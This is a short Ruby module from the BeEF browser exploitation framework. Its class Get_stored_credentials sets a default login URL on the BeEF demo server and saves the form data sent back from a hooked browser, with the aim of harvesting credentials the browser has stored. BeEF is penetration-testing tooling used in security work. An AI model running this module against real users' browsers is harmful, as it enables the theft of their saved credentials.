#
# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_stored_credentials < BeEF::Core::Command

	def self.options
		configuration = BeEF::Core::Configuration.instance
		proto = configuration.get("beef.http.https.enable") == true ? "https" : "http"
		uri = "#{proto}://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/butcher/index.html"
		return [
			{ 'name' => 'login_url', 'description' => 'Login URL', 'ui_label' => 'Login URL', 'value' => uri, 'width'=>'400px' }
		]
	end

	def post_execute
		content = {}
		content['form_data'] = @datastore['form_data']
		save content
	end

end
